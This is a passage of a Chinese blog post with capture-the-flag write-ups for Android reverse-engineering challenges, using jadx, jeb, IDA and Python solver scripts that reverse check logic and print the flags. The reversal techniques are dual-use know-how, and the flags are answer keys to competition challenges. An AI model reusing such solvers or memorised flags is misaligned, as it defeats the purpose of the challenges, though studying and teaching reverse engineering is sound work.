src="/posts/9f62af2/14.13.png" class="" title="资源文件"><p>将<code>resources.arsc</code>载入jadx，查找id号。</p><img src="/posts/9f62af2/14.14.png" class="" title="jadx分析"><p>继续查找<code>two_fish</code>，找到一串字符串，这个就是密钥。</p><img src="/posts/9f62af2/14.15.png" class="" title="jadx分析"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I have a male fish and a female fish.</span><br></pre></td></tr></table></figure><p>Twofish是什么？它其实是一个分组加密算法！Twofish是布鲁斯·施奈尔带领的项目组于1998年研发的区块加密算法。美国国家标准技术研究所(NIST)公开招募的高级加密标准（AES）算法最终候选算法之一，但最终并未当选高级加密标准算法。双鱼算法的标志性特点是它采用了和密钥相关的替换盒（S盒）。密钥输入位的一半被用于“真正的”加密流程进行编排并作为Feistel的轮密钥使用，而另一半用于修改算法所使用的S盒。双鱼算法的密钥编排非常复杂。软件实现的128位双鱼算法在大多数平台上的运行速度不及最终获胜的128位的AES标准算法Rijndael，不过，256位的双鱼算法运行速度却较AES-256稍快。包括Twofish-ECB, Twofish-CBC, Twofish-CTR, Twofish-OFB, Twofish-CFB。</p><p>所以再来捋一下思路。我们输入的字符串与密钥进行Twofish加密的结果是字节数组m。密钥经过&amp;0xFF转换不需要我们手动操作，因为网上的解密算法已经包含在内了。但网上的加密算法得出来的不是带负数的字节数组，而是Base64或hex。所以我们可以先将字节数组转换成Base64的形式，再拿去解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag = [-<span class="number">120</span>, <span class="number">77</span>, -<span class="number">14</span>, -<span class="number">38</span>, <span class="number">17</span>, <span class="number">5</span>, -<span class="number">42</span>, <span class="number">44</span>, -<span class="number">32</span>, <span class="number">109</span>, <span class="number">85</span>, <span class="number">31</span>, <span class="number">24</span>, -<span class="number">91</span>, -<span class="number">112</span>, -<span class="number">83</span>, <span class="number">64</span>, -<span class="number">83</span>, -<span class="number">128</span>, <span class="number">84</span>, <span class="number">5</span>, -<span class="number">94</span>, -<span class="number">98</span>, -<span class="number">30</span>, <span class="number">18</span>, <span class="number">70</span>, -<span class="number">26</span>, <span class="number">71</span>, <span class="number">5</span>, -<span class="number">99</span>, -<span class="number">62</span>, -<span class="number">58</span>, <span class="number">117</span>, <span class="number">29</span>, -<span class="number">44</span>, <span class="number">6</span>, <span class="number">112</span>, -<span class="number">4</span>, <span class="number">81</span>, <span class="number">84</span>, <span class="number">9</span>, <span class="number">22</span>, -<span class="number">51</span>, <span class="number">95</span>, -<span class="number">34</span>, <span class="number">12</span>, <span class="number">47</span>, <span class="number">77</span>]</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    data.append(i&amp;<span class="number">0xFF</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(<span class="built_in">bytes</span>(data)))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;iE3y2hEF1izgbVUfGKWQrUCtgFQFop7iEkbmRwWdwsZ1HdQGcPxRVAkWzV/eDC9N&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><img src="/posts/9f62af2/14.16.png" class="" title="twofish解密"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qwb&#123;TH3y_Io&lt;e_EACh_OTh3r_FOrEUER&#125;</span><br></pre></td></tr></table></figure><h1 id="15-你是谁"><a href="#15-你是谁" class="headerlink" title="15. 你是谁"></a>15. 你是谁</h1><img src="/posts/9f62af2/15.1.jpg" class="" title="运行程序"><p>载入AK，有so文件。载入jeb，找到<code>MainActivity</code>中的<code>onCreate</code>方法。</p><img src="/posts/9f62af2/15.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/15.3.png" class="" title="jeb分析"><img src="/posts/9f62af2/15.4.png" class="" title="jeb分析"><img src="/posts/9f62af2/15.5.png" class="" title="jeb分析"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11 12 17 18 20 23 26 29 30 34 35 39 40 49 51 58 62 67 73 76 84 85</span><br></pre></td></tr></table></figure><p>按照上面点位点好后，弹出<code>Right design</code>，点击按钮，弹出<code>通过爱的验证</code>。好像并没有什么用。再往上找找源码，发现有flag字样。</p><img src="/posts/9f62af2/15.6.png" class="" title="jeb分析"><p>中文意思是“你获得了已经排序过的flag”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">20667</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">25105</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">26159</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">36924</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">傻</span></span><br><span class="line"><span class="string">我</span></span><br><span class="line"><span class="string">是</span></span><br><span class="line"><span class="string">逼</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>结合题目和代码，这个重新排序应该是“我是傻逼”。而它说了，那个是排序过的flag，而正确的flag应该为<code>25105 26159 20667 36924</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25105 26159 20667 36924&#125;</span><br></pre></td></tr></table></figure><h1 id="16-Android2-0"><a href="#16-Android2-0" class="headerlink" title="16. Android2.0"></a>16. Android2.0</h1><img src="/posts/9f62af2/16.1.png" class="" title="运行程序"><p>载入AK发现有so文件，载入jeb分析源码。</p><img src="/posts/9f62af2/16.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/16.3.png" class="" title="jeb分析"><p>解包，将so文件载入IDA，分析<code>getResult</code>方法。</p><img src="/posts/9f62af2/16.4.png" class="" title="IDA分析"><img src="/posts/9f62af2/16.5.png" class="" title="IDA分析"><p>尝试编写Python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v5 = <span class="string">&quot;LN^dl&quot;</span></span><br><span class="line">v5arr = <span class="built_in">list</span>(v5)</span><br><span class="line">v6 = [<span class="number">0x20</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">0x16</span>, <span class="number">97</span>]</span><br><span class="line">v7 = <span class="built_in">list</span>(<span class="string">&quot;AFBo&#125;&quot;</span>)</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ans += <span class="built_in">chr</span>((<span class="built_in">ord</span>(v5arr[i]) ^ <span class="number">0x80</span>) // <span class="number">2</span>)</span><br><span class="line">ans += <span class="string">&#x27;l&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ans += <span class="built_in">chr</span>(<span class="built_in">ord</span>(v5arr[i]) ^ v6[i])</span><br><span class="line">ans += <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ans += <span class="built_in">chr</span>(<span class="built_in">ord</span>(v7[i]) ^ v6[i])</span><br><span class="line">ans += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fgorll&#123;sraasoy&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>提交flag发现不对，看看哪里漏了。最后发现<code>Init</code>函数不是简单的平均分成3组，而是对正确的flag的每个索引除以3取余得到<code>fgorll&#123;sraasoy&#125;</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ans = <span class="string">&quot;fgorll&#123;sraasoy&#125;&quot;</span></span><br><span class="line">ansarr = <span class="built_in">list</span>(ans)</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    ans += ansarr[i] + ansarr[i+<span class="number">5</span>] + ansarr[i+<span class="number">10</span>]</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag&#123;sosorryla&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>        </span><br></pre></td></tr></table></figure><h1 id="17-boomshakalaka-3"><a href="#17-boomshakalaka-3" class="headerlink" title="17. boomshakalaka-3"></a>17. boomshakalaka-3</h1><p>啊好讨厌为什么它是游戏！！我已经玩了好几分钟了！</p><img src="/posts/9f62af2/17.1.png" class="" title="运行程序"><p>载入AK看到它有so文件，载入jeb分析源码：</p><img src="/posts/9f62af2/17.2.png" class="" title="jeb分析"><p>这个base64解码得<code>bazingaaaa</code>。诶结果不是这个。进去a类看看吧。</p><img src="/posts/9f62af2/17.3.png" class="" title="jeb分析"><p>SharedPreferences是一个轻量级的存储类，特别适合用于保存软件配置参数。使用SharedPreferences保存数据，其背后是用xml文件存放数据，文件存放在/data/data/程序包名/shared_prefs目录下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> SharedPreferences <span class="title function_">getSharedPreferences</span><span class="params">(String name, <span class="type">int</span> mode)</span>;</span><br></pre></td></tr></table></figure><p>第一个参数是存储时的名称，第二个参数则是文件的打开方式。</p><p>那我们先找找它的xml文件吧。这个程序的包名为<code>com.example.plane</code>，包名可在<code>AndroidManifest.xml</code>的<code>manifest</code>标签中找到。</p><img src="/posts/9f62af2/17.4.png" class="" title="程序包名"><img src="/posts/9f62af2/17.5.png" class="" title="xml文件"><img src="/posts/9f62af2/17.6.png" class="" title="xml文件"><p>所以可以推测<code>N0</code>和<code>MG</code>被写进了<code>Cocos2dxPrefsFile.xml</code>文件中。</p><img src="/posts/9f62af2/17.7.png" class="" title="jeb分析"><p>但打开<code>Cocos2dxPrefsFile.xml</code>文件却发现不止这两个字符串。我刚才玩了两次，出现了两个极为相似的字符串。</p><img src="/posts/9f62af2/17.8.png" class="" title="xml文件"><p>那就再玩几次试试。我发现每次关闭程序再打开又重新写入<code>MGN0</code>，而不关闭程序重新玩不会写入<code>MGN0</code>，每次结束都会以<code>dz99</code>为结束标志。**里面的是每个串的区别。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MGN0ZntDMGNvUzJkX0FuRHJvMW*Rf*dz99</span><br><span class="line">    ZntDMGNvUzJkX0FuRHJvMW*RfRV*dz99</span><br><span class="line"></span><br><span class="line">MGN0ZntDMGNvUzJkX0FuRHJvMW*RfRV*dz99</span><br><span class="line"></span><br><span class="line">MGN0ZntDMGNvUzJkX0FuRHJvMW*RfRzRV*dz99</span><br><span class="line"></span><br><span class="line">MGN0ZntDMGNvUzJkX0FuRHJvMW*RfRz*dz99</span><br><span class="line">    ZntDMGNvUzJkX0FuRHJvMWdz99</span><br><span class="line">    ZntDMGNvUzJkX0FuRHJvMW*Rf*dz99</span><br></pre></td></tr></table></figure><p>这些星号里面的串有些区别，但又是固定出现的，比如都是<code>Rf</code>、<code>RV</code>等等。说明在某个内存中存有这些字符。解包将so文件载入IDA，在函数名窗口搜索<code>score</code>，发现有好多这些字符串。</p><img src="/posts/9f62af2/17.9.png" class="" title="IDA分析"><p>原来<code>MW</code>其实也是包含在里面的。将这些字符串组合起来<code>MWRfRzBtRV9Zb1VfS24w</code>，再将前缀和后缀加上<code>MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99</code>。用Base64解码得<code>0ctf&#123;C0coS2d_AnDro1d_G0mE_YoU_Kn0w?&#125;</code>。为什么用Base64，其实题目上面的flag.xml中的Base64字符串已经暗示得很清楚了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0ctf&#123;C0coS2d_AnDro1d_G0mE_YoU_Kn0w?&#125;</span><br></pre></td></tr></table></figure><h1 id="18-Illusion"><a href="#18-Illusion" class="headerlink" title="18. Illusion"></a>18. Illusion</h1><p>运行程序。</p><img src="/posts/9f62af2/18.1.png" class="" title="运行程序"><p>载入AK，有一个Flag文件，打开出现一串字符串<code>Ku@&#39;G_V9v(yGS</code>。</p><img src="/posts/9f62af2/18.2.png" class="" title="AK中看到Flag文件"><p>载入jeb，分析源码。</p><img src="/posts/9f62af2/18.3.png" class="" title="jeb分析"><p>将so文件载入IDA查看<code>CheckFlag</code>方法。</p><img src="/posts/9f62af2/18.4.png" class="" title="IDA分析"><p>如果要将算法逆过来，就需要将Flag里的字符串减32再左移32位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="built_in">list</span>(<span class="string">&quot;Ku@&#x27;G_V9v(yGS&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = (<span class="built_in">ord</span>(flag[i]) - <span class="number">32</span>) &lt;&lt; <span class="number">32</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[184683593728, 365072220160, 137438953472, 30064771072, 167503724544, 270582939648, 231928233984, 107374182400, 369367187456, 34359738368, 382252089344, 167503724544, 219043332096]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>所以<code>sub_10C0</code>每次循环得出的值就是上面这一串数字。进去<code>sub_10C0</code>看看算法。</p><img src="/posts/9f62af2/18.5.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.6.png" class="" title="IDA分析"><p>(说着随机选取，结果还是认真算了)Flag字符串长度为13，所以在<code>aE116c5c66e7b37</code>数组中只取前13个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000023C8                 ; ORG 0x23C8</span><br><span class="line">.rodata:000023C8 aE116c5c66e7b37 DCB &quot;e116c5c66e7b373d912cb9b885b48913&quot;,0</span><br></pre></td></tr></table></figure><p>前13个字符为<code>e116c5c66e7b3</code>，其中最大的ASCII码为<code>e</code>(101)，最小是<code>1</code>(49)。而我们可以输入的可视化字符的ASCII码范围是32~126。所以<code>v9[i]+aE116c5c66e7b37[i]-64</code>的范围应该在17~163。照着IDA的代码抄一遍：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> a1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>,<span class="number">164</span>):</span><br><span class="line">    a2 = <span class="number">93</span></span><br><span class="line">    v2 = a1 ^ a2</span><br><span class="line">    v3 = <span class="number">1</span></span><br><span class="line">    v4 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span>((a2 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>):</span><br><span class="line">        a2 = -a2</span><br><span class="line">    <span class="keyword">if</span>((a1 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>):</span><br><span class="line">        a1 = -a1</span><br><span class="line">    <span class="keyword">if</span>(a1 &gt;= a2):</span><br><span class="line">        <span class="keyword">while</span> a2&lt;<span class="number">0x10000000</span> <span class="keyword">and</span> a2&lt;a1:</span><br><span class="line">            a2 *= <span class="number">16</span></span><br><span class="line">            v3 *= <span class="number">16</span></span><br><span class="line">        <span class="keyword">while</span> a2&lt;<span class="number">0x80000000</span> <span class="keyword">and</span> a2&lt;a1:</span><br><span class="line">            a2 *= <span class="number">2</span></span><br><span class="line">            v3 *= <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2):</span><br><span class="line">                a1 -= a2</span><br><span class="line">                v4 |= v3</span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">1</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">1</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">2</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">2</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">3</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">3</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> a1 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            v3 &gt;&gt;= <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> v3 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            a2 &gt;&gt;= <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> v2 &lt; <span class="number">0</span>:</span><br><span class="line">        v4 = -v4</span><br><span class="line">    <span class="built_in">print</span>(v4, end = <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 Press any key to continue . . .</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>在这个范围完全没有这么大的数值…而且在这个范围要不就返回0要不就返回1。肯定是哪里出问题了。呜呜我看了牛牛们的wp说这个是假的，真的<code>CheckFlag</code>在<code>JNI_Onload</code>函数里，我就知道！！我就说导出表都有<code>CheckFlag</code>了怎么还有个<code>JNI_Onload</code>！以后记住从<code>JNI_Onload</code>进去准没错，还是没能抵挡住<code>CheckFlag</code>的诱惑。</p><img src="/posts/9f62af2/18.9.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.10.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.11.png" class="" title="IDA分析"><p>可以继续试试参数范围。<code>aLjavaLangStrin_0</code>存的字符串为<code>(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</code>。取前13个字符为<code>(Ljava/lang/S</code>。最小的ASCII码为<code>40</code>(<code>(</code>)，最大的ASCII码为<code>118</code>(v)。所以<code>v10[i]+aLjavaLangStrin_0[i]-64</code>的范围在8~180。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 Press any key to continue . . .</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>还是要不就是0要不就是1。这个时候就不要想是不是你的问题了！肯定是IDA反汇编的错！所以接下来要看汇编代码找到正确的逻辑。</p><img src="/posts/9f62af2/18.7.png" class="" title="IDA分析"><p>对于栈的立即数，可以右键 -&gt; Q算得栈的偏移值。</p><img src="/posts/9f62af2/18.8.jpg" class="" title="IDA分析"><img src="/posts/9f62af2/18.12.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.13.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.14.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.15.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.16.png" class="" title="IDA分析"><p>到这已经将所有细节都分析了，除了<code>sub_1028</code>，如果它反编译没错的话那答案基本就已经出来了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = ((输入的字符串+内存字符串-64) - sub_1028(输入的字符串+内存字符串-64, 93) * 93) + 32</span><br></pre></td></tr></table></figure><p>编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&quot;Ku@&#x27;G_V9v(yGS&quot;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">list</span>(<span class="string">&quot;(Ljava/lang/S&quot;</span>)</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#输出可打印字符串</span></span><br><span class="line"><span class="built_in">input</span> = string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1028</span>(<span class="params">a1</span>):</span><br><span class="line">    a2 = <span class="number">93</span></span><br><span class="line">    v2 = a1 ^ a2</span><br><span class="line">    v3 = <span class="number">1</span></span><br><span class="line">    v4 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span>((a2 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>):</span><br><span class="line">        a2 = -a2</span><br><span class="line">    <span class="keyword">if</span>((a1 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>):</span><br><span class="line">        a1 = -a1</span><br><span class="line">    <span class="keyword">if</span>(a1 &gt;= a2):</span><br><span class="line">        <span class="keyword">while</span> a2&lt;<span class="number">0x10000000</span> <span class="keyword">and</span> a2&lt;a1:</span><br><span class="line">            a2 *= <span class="number">16</span></span><br><span class="line">            v3 *= <span class="number">16</span></span><br><span class="line">        <span class="keyword">while</span> a2&lt;<span class="number">0x80000000</span> <span class="keyword">and</span> a2&lt;a1:</span><br><span class="line">            a2 *= <span class="number">2</span></span><br><span class="line">            v3 *= <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2):</span><br><span class="line">                a1 -= a2</span><br><span class="line">                v4 |= v3</span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">1</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">1</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">2</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">2</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">3</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">3</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> a1 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            v3 &gt;&gt;= <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> v3 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            a2 &gt;&gt;= <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> v2 &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -v4</span><br><span class="line">    <span class="keyword">return</span> v4</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">        data = <span class="built_in">ord</span>(j) + <span class="built_in">ord</span>(<span class="built_in">str</span>[i]) - <span class="number">64</span></span><br><span class="line">        v4 = sub_1028(data)</span><br><span class="line">        <span class="keyword">if</span> (data - v4 * <span class="number">93</span>) + <span class="number">32</span> == <span class="built_in">ord</span>(flag[i]):</span><br><span class="line">            ans += j</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">CISCN&#123;GJ5728&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="19-APK逆向-2"><a href="#19-APK逆向-2" class="headerlink" title="19. APK逆向-2"></a>19. 